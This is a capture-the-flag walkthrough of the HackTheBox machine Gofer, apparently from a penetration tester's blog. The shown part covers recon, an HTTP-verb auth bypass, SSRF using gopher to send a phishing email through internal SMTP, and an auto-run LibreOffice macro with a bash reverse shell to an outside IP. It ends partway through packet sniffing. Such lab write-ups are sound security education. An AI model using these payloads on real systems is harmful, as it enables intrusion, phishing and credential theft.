HTB: Gofer
==========

![Gofer](https://0xdf.gitlab.io/img/gofer-cover.png)

Gofer starts with a proxy that requires auth. I’ll bypass this using different HTTP verbs, and get access to the proxy that allows for gopher protocol. I’ll use that to interact with an internal SMTP server and send a phishing email to one of the users with a LibreOffice Writer (like Word) attachment. With a shell, I’ll use tcpdump to sniff traffic and catch the next user logging into the proxy. That password is shared on the system. This user has access to a simple notes program running as root. I’ll identify and exploit a use after free vulnerability and a path hijack just by playing with it. Then in Beyond Root, I’ll open it with Ghidra and see what it is doing, and take a look at the filter rules on the proxy.

## Box Info

Name[Gofer](https://www.hackthebox.com/machines/gofer) [![Gofer](https://0xdf.gitlab.io/icons/box-gofer.png)](https://www.hackthebox.com/machines/gofer)

[Play on HackTheBox](https://www.hackthebox.com/machines/gofer)Release Date[29 Jul 2023](https://twitter.com/hackthebox_eu/status/1684586987188097025)Retire Date28 Oct 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsHard \[40\]Rated Difficulty![Rated difficulty for Gofer](https://0xdf.gitlab.io/img/gofer-diff.png)Radar Graph![Radar chart for Gofer](https://0xdf.gitlab.io/img/gofer-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:45:24 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)01:07:13 [![jkr](https://www.hackthebox.eu/badge/image/77141)](https://app.hackthebox.com/users/77141)

Creator[![Que20](https://www.hackthebox.eu/badge/image/12877)](https://app.hackthebox.com/users/12877)

## Recon

### nmap

`nmap` finds four open TCP ports, SSH (22), HTTP (80), netbois (139), and SMB (445), as well as a filtered SMTP port (25):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.225
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-23 21:05 EDT
Nmap scan report for 10.10.11.225
Host is up (0.091s latency).
Not shown: 65530 closed ports
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  filtered smtp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
oxdf@hacky$ nmap -p 22,25,80,139,445 -sCV 10.10.11.225
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-23 21:06 EDT
Nmap scan report for 10.10.11.225
Host is up (0.091s latency).

PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 16h05m44s
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-10-24T17:12:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 11 bullseye. I’ll note the clock is off from mine by 16 hours.

There’s a redirect on port 80 to `gofer.htb`.

I’ll want to check on the SMTP port once I get more access.

### SMB - TCP 445

#### Identify Shares

Interestingly, `netexec` (the latest open-source fork of `crackmapexec`) thinks this is a Windows host:

```
oxdf@hacky$ netexec smb 10.10.11.225
SMB         10.10.11.225    445    GOFER            [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False)

```

It gives the domains `gofer.htb`. Without auth, it’s unable to access any information about the shares:

```
oxdf@hacky$ netexec smb 10.10.11.225 --shares
SMB         10.10.11.225    445    GOFER            [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False)
SMB         10.10.11.225    445    GOFER            [-] Error getting user: list index out of range
SMB         10.10.11.225    445    GOFER            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

With fake creds, it complains about the domain:

```
oxdf@hacky$ netexec smb 10.10.11.225 --shares -u 0xdf -p notthepassword
SMB         10.10.11.225    445    GOFER            [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False)
[21:14:52] ERROR    Domain htb for user 0xdf need to be FQDN ex:domain.local, not domain             connection.py:372
SMB         10.10.11.225    445    GOFER            [-] Error getting user: list index out of range
SMB         10.10.11.225    445    GOFER            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

If I update the domain as suggested, it works:

```
oxdf@hacky$ netexec smb 10.10.11.225 --shares -u 0xdf -p notthepassword -d gofer.htb
SMB         10.10.11.225    445    GOFER            [*] Windows 6.1 Build 0 (name:GOFER) (domain:gofer.htb) (signing:False) (SMBv1:False)
SMB         10.10.11.225    445    GOFER            [+] gofer.htb\0xdf:notthepassword
SMB         10.10.11.225    445    GOFER            [*] Enumerated shares
SMB         10.10.11.225    445    GOFER            Share           Permissions     Remark
SMB         10.10.11.225    445    GOFER            -----           -----------     ------
SMB         10.10.11.225    445    GOFER            print$                          Printer Drivers
SMB         10.10.11.225    445    GOFER            shares          READ
SMB         10.10.11.225    445    GOFER            IPC$                            IPC Service (Samba 4.13.13-Debian)

```

`-N` does work nicely for this kind of auth with `smbclient`:

```
oxdf@hacky$ smbclient //10.10.11.225/shares -N
Try "help" to get a list of possible commands.
smb: \>

```

There’s a single `.backup` folder in the share:

```
smb: \> dir
  .                                   D        0  Fri Oct 28 15:32:08 2022
  ..                                  D        0  Fri Apr 28 07:59:34 2023
  .backup                            DH        0  Thu Apr 27 08:49:32 2023

                5061888 blocks of size 1024. 1324628 blocks available

```

It has a file named `mail`, which I’ll grab:

```
smb: \> cd .backup
smb: \.backup\> dir
  .                                   D        0  Thu Apr 27 08:49:32 2023
  ..                                  D        0  Fri Oct 28 15:32:08 2022
  mail                                N     1101  Thu Apr 27 08:49:32 2023

                5061888 blocks of size 1024. 1324564 blocks available
smb: \.backup\> get mail
getting file \.backup\mail of size 1101 as mail (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)

```

#### mail

The file is a single email:

```
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>

```

There are some take-aways in this email:

- Jocelyn is especially susceptible to phishing.
- The company policy is to use LibreOffice documents ( `.odt` is the LibreOffice equivalent of Word’s `.doc`).
- There is some kind of in development web proxy associated with Tom.
- The SMTP server here is Postfix, which could be what’s running on TCP 25.
- Two names, Jocelyn and Tom.
- Two email addresses: tbuckley@gofer.htb and jdavis@gofer.htb. These seem like a first initial plus last name scheme, as tbuckley is likely Tom.

### Subdomain Brute Force

Given the redirect to the hostname, I’ll check for any subdomains that return a different result via virtual host routing with `ffuf`. I like to use `-mc all` to get all response codes and `-ac` to automatically filter results to just show ones that are different than the default case:

```
oxdf@hacky$ ffuf -u http://10.10.11.225 -H "Host: FUZZ.gofer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.225
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.gofer.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

proxy                   [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 91ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 90ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 90ms]
:: Progress: [19966/19966] :: Job [1/1] :: 439 req/sec :: Duration: [0:00:55] :: Errors: 0 ::

```

`#www` and `#mail` seem like false positives, but `proxy` is interesting. That matches the mention of the proxy in the mail above. I’ll add both of these to my `/etc/hosts` file:

```
10.10.11.225 gofer.htb proxy.gofer.htb

```

### gofer.htb - TCP 80

#### Site

The site is for a website design firm:

![image-20231024133439420](https://0xdf.gitlab.io/img/image-20231024133439420.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

All of the links go to other places on the same page. There’s a list of the employees and their names / roles:

- Jeff Davis - Chief Executive Officer
- Jocelyn Hudson - Product Manager
- Tom Buckley - CTO
- Amanda Blake - Accountant

The email addresses map to these names nicely. There’s also an email `info@gofer.htb` by the “contact” form. Trying to submit the form just results in an error:

![image-20231024135304817](https://0xdf.gitlab.io/img/image-20231024135304817.png)

It’s not set up to work.

#### Tech Stack

The HTTP response headers show Apache and not much else:

```
HTTP/1.1 200 OK
Date: Tue, 24 Oct 2023 17:34:26 GMT
Server: Apache/2.4.56 (Debian)
Last-Modified: Fri, 28 Apr 2023 14:21:26 GMT
ETag: "72c4-5fa66303d293d-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 29380
Connection: close
Content-Type: text/html

```

The main page loads as `index.html`, suggesting this is just a static site. If I try `index.php`, it returns a 404:

![image-20231024135457713](https://0xdf.gitlab.io/img/image-20231024135457713.png)

That’s the standard Apache 404 page.

The page source doesn’t have anything else interesting.

#### Directory Brute Force

I’ll brute force paths on the server with `feroxbuster`, giving it `-x html` to try HTML extensions as well.:

```
oxdf@hacky$ feroxbuster -u http://gofer.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gofer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      621l     2087w    29380c http://gofer.htb/
301      GET        9l       28w      307c http://gofer.htb/assets => http://gofer.htb/assets/
200      GET      621l     2087w    29380c http://gofer.htb/index.html
[####################] - 1m     60000/60000   0s      found:3       errors:0
[####################] - 1m     30000/30000   265/s   http://gofer.htb/
[####################] - 0s     30000/30000   0/s     http://gofer.htb/assets/ => Directory listing (remove --dont-extract-links to scan)

```

Nothing interesting.

### proxy.gofer.htb - TCP 80

#### Site

Visiting `proxy.gofer.htb` returns a pop for HTTP basic auth (which matches the 401 response shown by `ffuf`):

![image-20231024133326723](https://0xdf.gitlab.io/img/image-20231024133326723.png)

A couple quick guesses don’t get anywhere.

#### Tech Stack

The HTTP response headers don’t show anything here either:

```
HTTP/1.1 401 Unauthorized
Date: Tue, 24 Oct 2023 17:33:02 GMT
Server: Apache/2.4.56 (Debian)
WWW-Authenticate: Basic realm="Restricted Content"
Content-Length: 462
Connection: close
Content-Type: text/html; charset=iso-8859-1

```

Anything I try to access gets the same auth response. That’s likely happening at the Apache level before it reaches the server.

#### Directory Brute Force

I’ll try `feroxbuster` here as well, and it finds nothing:

```
oxdf@hacky$ feroxbuster -u http://proxy.gofer.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://proxy.gofer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       14l       54w      462c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 1m     30000/30000   0s      found:0       errors:1
[####################] - 1m     30000/30000   497/s   http://proxy.gofer.htb/

```

## Shell as jhudson

### Access Proxy

#### Fuzz Request Methods

I’ll come back to `feroxbuster` again with two additional changes:

- I’ll add different methods to try with `-m`.
- I’ll include the `.php` extension. I haven’t see any PHP pages yet, but the proxy needs to be more than a static site, so PHP, Python, Ruby, JavaScript, etc. With the exception of PHP, most of those would define routes without extensions. So I’ll add `.php` for that case.

```
oxdf@hacky$ feroxbuster -u http://proxy.gofer.htb -m GET,POST,PUT,OPTIONS,CONNECT -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://proxy.gofer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST, PUT, OPTIONS, CONNECT]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
401      GET       14l       54w      462c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403     POST        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      PUT        9l       34w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      PUT        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      PUT        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200  OPTIONS        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403  OPTIONS        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404  OPTIONS        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400  CONNECT       10l       35w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200     POST        2l       10w       81c http://proxy.gofer.htb/index.php
200      PUT        2l       10w       81c http://proxy.gofer.htb/index.php
200  OPTIONS        2l       10w       81c http://proxy.gofer.htb/index.php
[####################] - 9m    150000/150000  0s      found:3       errors:0
[####################] - 9m    150000/150000  259/s   http://proxy.gofer.htb/

```

Very quickly it shows that `POST`, `PUT`, and `OPTIONS` all return 200 for `index.php` with a 81 character response. It seems that the block is on the GET method!

#### Working Proxy

I’ll send the GET request for the page over to Burp Repeater and change the method to POST. It returns an error message:

![image-20231024162122768](https://0xdf.gitlab.io/img/image-20231024162122768.png)

Given that this is a POST request, I’ll try including `url` there:

![image-20231024162307659](https://0xdf.gitlab.io/img/image-20231024162307659.png)

Still missing. It must be reading from `$_GET["url"]` or the parameter must not be `url`. I’ll try it as a GET parameter, and it works:

![image-20231024162408720](https://0xdf.gitlab.io/img/image-20231024162408720.png)

I don’t get the CSS or other stuff, but the page loads!

#### SSRF

I’ll try to reach my own server:

![image-20231024171328116](https://0xdf.gitlab.io/img/image-20231024171328116.png)

It returns an error, but that’s because there’s no file `ssrf` on my server:

```
10.10.11.225 - - [24/Oct/2023 01:07:47] code 404, message File not found
10.10.11.225 - - [24/Oct/2023 01:07:47] "GET /ssrf HTTP/1.1" 404 -

```

At this point, it’s not immediately clear what this would buy me, other than showing that I can issue requests. I am curious to know what is making the requests, but if I listen with `nc` and catch the request, there’s no User Agent header:

```
oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.225 58378
GET /ssrf HTTP/1.1
Host: 10.10.14.6
Accept: */*

```

#### Blocklist

I didn’t run into this issue because I used `gofer.htb` to reference the box, and that is in the box’s `hosts` files, so it resolves. However, one challenge that’s intended to be bypassed happens if I try to access `localhost` or `127.0.0.1`:

![image-20231024165831525](https://0xdf.gitlab.io/img/image-20231024165831525.png)

There’s a bunch of ways around this. `0.0.0.0` works. I already noted that `gofer.htb` works. Interestingly, `2130706433` doesn’t work, I suspect because it returns a 301 redirect to `gofer.htb` which the proxy doesn’t know how to parse.

If I try to read a file, I’ll also run into that blocklist:

![image-20231024170359211](https://0xdf.gitlab.io/img/image-20231024170359211.png)

SMTP is blocked as well. I could do some fuzzing from here, but the thing I need to know is clear from the name of the box. Gopher is not blocked:

![image-20231024171231847](https://0xdf.gitlab.io/img/image-20231024171231847.png)

I’ll look at the blocklist in [Beyond Root](#proxy-bad-words).

### Email Jocelyn

#### Gopher Background

[Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)) is a protocol designed for interacting with documents over IP networks. It was an alternative to HTTP when the internet first came into being, and practically isn’t used anymore.

What’s cool about the `gopher` while hacking is that it doesn’t use headers or even newlines as part of the protocol. I’ll include a single character after the `/`, and then the rest of the URL is considered the raw payload. For example, if I access the following URL:

```
/index.php?url=gopher://10.10.14.6:80/_this%20is%20a%20test

```

What reached my `nc` is:

```
oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.225 36342
this is a test

```

I can try to add newlines with `%0d%0a`, but it doesn’t work. However, a second URL encode does. So:

```
/index.php?url=gopher://10.10.14.6:80/_this%20is%20a%20test%250d%250asecond%20line

```

Leads to:

```
oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.225 34614
this is a test
second line

```

This means I can effectively interact with whatever service I want using GET requests. I’ve shown examples of Gopher in the past with [Travel](https://0xdf.gitlab.io/2020/09/12/htb-travel.html#interaction-with-memcache) (interacting with `memcache`), [Laser](https://0xdf.gitlab.io/2020/12/19/htb-laser.html#strategy) (sending a Solr exploit), and [Jarmis](https://0xdf.gitlab.io/2021/09/27/htb-jarmis.html#strategy-1) (exploiting [OMIGod](https://github.com/horizon3ai/CVE-2021-38647)).

#### SMTP POC

I know from the clues before that I want to interact with SMTP on 25. The [SMTP protocol](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol#Protocol_overview) has some basic commands for interacting. I’ve shown interacting with it over `telnet` or `nc` before (for example in [Attended](https://0xdf.gitlab.io/2021/05/08/htb-attended.html#smtp---tcp-25)).

The simplest command is `QUIT`, which ends the session. I’ll try sending that, followed by a newline:

![image-20231024173735715](https://0xdf.gitlab.io/img/image-20231024173735715.png)

The response shows the banner and then the Bye message. That was a successful connection.

#### Full Email

To send a full email to Jocelyn, I’ll need to work through what it will look like to get something like this:

```
HELO 0xdf
MAIL FROM:0xdf@gofer.htb
RCPT TO:jhudson@gofer.htb
DATA
Subject: Please click immediately!
Message: Hello Jocelyn,
Please visit the following ASAP! http://10.10.14.6/phish
.
QUIT

```

That encodes by replacing the spaces with `%20` and the newlines with `%250d%250a`:

![image-20231024174432155](https://0xdf.gitlab.io/img/image-20231024174432155.png)

And it works, queuing the email to send.

Less than a minute later, there’s a click on the link:

```
10.10.11.225 - - [24/Oct/2023 01:38:16] code 404, message File not found
10.10.11.225 - - [24/Oct/2023 01:38:16] "GET /phish HTTP/1.1" 404 -

```

### Malicious ODT

#### Background

I’ve shown phishing with LibreOffice documents before. In [RE](https://0xdf.gitlab.io/2020/02/01/htb-re.html#prepare-document), I made an `.ods` (equivalent of Excel for LibreOffice) file with a macro to run on opening, and it needed to avoid some Yara filters detecting Metasploit payloads. In [Rabbit](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html#phishing), I created a `.odt` file for an OpenOffice target (OpenOffice and LibreOffice are very similar, and use the same file extensions).

#### Create Document

I’ll open LibreOffice Writer (like Word) and put some dummy text into the document:

![image-20231024211104767](https://0xdf.gitlab.io/img/image-20231024211104767.png)

And save it as `report.odt`.

I’ll open the “Organize Macros > Basic” menu:

![image-20231024212106047](https://0xdf.gitlab.io/img/image-20231024212106047.png)

Here, I’ll find my document, and under “Standard”, click, and select the “New” button:

![image-20231024212220990](https://0xdf.gitlab.io/img/image-20231024212220990.png)

This pops a dialog asking for a name, and then opens the macro editor:

![image-20231024212258047](https://0xdf.gitlab.io/img/image-20231024212258047.png)

I’ll add a simple reverse shell:

```
Sub Main

	shell("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'")

End Sub

```

![image-20231026065556394](https://0xdf.gitlab.io/img/image-20231026065556394.png)

To get this to run automatically on opening, I’ll close the Macro editor and in the document window go to “Tools” > “Customize”. In the window that opens, I’ll go to the “Events” tab, click on “Open Document” and then “Macro…”:

![image-20231024212715560](https://0xdf.gitlab.io/img/image-20231024212715560.png)

I’ll select “Module1” and “Main”, and click ok:

![image-20231024212804933](https://0xdf.gitlab.io/img/image-20231024212804933.png)

It shows under “Assigned Action”:

![image-20231024212824959](https://0xdf.gitlab.io/img/image-20231024212824959.png)

I’ll save and close the document.

#### Deliver

I’ll update the link in my email and send it again:

![image-20231024212457644](https://0xdf.gitlab.io/img/image-20231024212457644.png)

There’s a request for the document at my server:

```
10.10.11.225 - - [26/Oct/2023 07:00:37] "GET /report.odt HTTP/1.1" 200 -

```

And then a reverse shell at listening `nc` as jhudson:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.225 53300
bash: cannot set terminal process group (1178586): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/jhudson/.bashrc: Permission denied
jhudson@gofer:/usr/bin$

```

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q) with the standard trick:

```
jhudson@gofer:/usr/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
jhudson@gofer:/usr/bin$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
jhudson@gofer:/usr/bin$

```

And read `user.txt`:

```
jhudson@gofer:~$ cat user.txt
f387d527************************

```

## Shell as tbuckley

### Enumeration

#### General

The OS is Debian bullseye [as suspected](#nmap):

```
jhudson@gofer:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye

```

Neither `sudo` nor `doas` seem to be on Gofer (the file in `completions` is a Bash script, not the `sudo` binary):

```
jhudson@gofer:~$ sudo -l
bash: sudo: command not found
jhudson@gofer:~$ doas
bash: doas: command not found
jhudson@gofer:~$ find / -name 'sudo' 2>/dev/null
/usr/share/bash-completion/completions/sudo
jhudson@gofer:~$ find / -name 'doas' 2>/dev/null

```

#### SetUID / SetGID Binaries

Looking for SetUID/SetGID binaries, one does jump out as unusual:

```
jhudson@gofer:~$ find / -perm -4000 -or -perm -6000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/local/bin/notes

```

`notes` is owned by root, configured as SetUID and SetGID:

```
jhudson@gofer:~$ ls -l /usr/local/bin/notes
-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes

```

It’s only executable by members of the `dev` group.

#### Capabilities

The `getcap` binary is not in jhudson’s `PATH`, but it is on Gofer and executable by anyone (putting binaries in `sbin` and not having that in non-admin user’s `PATH` is common on Debian). Running it across the entire drive finds three results:

```
jhudson@gofer:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip

```

`tcpdump` is very interesting!

```
jhudson@gofer:~$ ls -l /usr/bin/tcpdump
-rwxr-xr-x 1 root root 1261512 May 22  2022 /usr/bin/tcpdump

```

This means that any user can sniff packets.

#### Groups

jhudson is in the `netdev` group:

```
jhudson@gofer:~$ id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)

```

I suspect `tcpdump` is supposed to only be executable by that group (would add to the realism of the box), but that got dropped at some point in VM creation / testing.

Because jhudson is not in `dev`, this user can’t run `notes`. The only user in `dev` is tbuckley:

```
jhudson@gofer:~$ cat /etc/group | grep dev
plugdev:x:46:
netdev:x:108:jhudson
dev:x:1004:tbuckley

```

I’ll have to come back to that when I get access to tbuckley.

#### Web Configuration

The `/etc/apache2/sites-enabled` folder will have the configurations for the various web servers. There’s only one file, `000-default.conf`. With the comments removed, there are two servers. The first is the main site:

```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^gofer.htb$
        RewriteRule ^(.*)$ http://gofer.htb$1 [R=permanent,L]
</VirtualHost>

```

There’s a rewrite rule that redirects to `gofer.htb` if that’s not the host. And it hosts files from `/var/www/html`, which has only a static `index.html` file and an `assets` folder. Nothing interesting there.

The second virtual host is the proxy:

```
<VirtualHost *:80>
  ServerName proxy.gofer.htb
  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/proxy
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  <Directory "/var/www/proxy">
    DirectoryIndex index.php index.html
    Options Indexes FollowSymLinks MultiViews
    <Limit GET>
        AuthType Basic
        AuthName "Restricted Content"
        AuthUserFile /etc/apache2/.htpasswd
        Require valid-user
    </Limit>
  </Directory>
</VirtualHost>

```

It hosts from `/var/www/proxy` (which only has a single file, `index.php`). The most interesting part is the auth configuration, which says the password hash is stored in `/etc/apache2/.htpasswd`.

```
jhudson@gofer:/etc/apache2$ cat .htpasswd
tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/

```

I’ll try taking that hash to HashCat for cracking, but it doesn’t crack.

### Sniffing

#### Survey

To get a feel for what TCP traffic I can sniff, I’ll run the following `tcpdump` arguments:

- `-i any` \- sniff on all interfaces
- `-n` \- disable hostname resolution
- `-q` \- suppress packet data, showing only high-level information
- `-s 0`: capture the entire packet
- `not host 10.10.14.6`: exclude packets to or from my VM
- `and tcp`: include only TCP traffic

Within a minute, there’s traffic:

```
jhudson@gofer:/etc/apache2$ tcpdump -i any -nqt not host 10.10.14.6 and tcp
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 0
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 163
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 0
lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39912: tcp 0
